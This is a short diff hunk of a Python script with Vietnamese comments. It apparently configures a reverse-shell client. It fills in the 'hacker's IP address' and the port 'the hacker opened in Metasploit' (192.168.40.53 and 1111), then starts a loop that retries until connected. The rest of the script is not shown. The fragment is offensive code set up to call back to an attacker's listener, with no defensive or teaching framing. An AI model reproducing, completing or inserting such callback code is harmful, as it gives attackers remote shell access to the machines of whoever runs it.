@@ -4,8 +4,8 @@ import time
 import threading
 import ctypes
 
-ip = "<ip>" # địa chỉ ip hacker 
-port = <port> # số cổng hacker đã mở bên Metasploit
+ip = "192.168.40.53" # địa chỉ ip hacker 
+port = 1111 # số cổng hacker đã mở bên Metasploit
 connected = False
 
 while not connected:
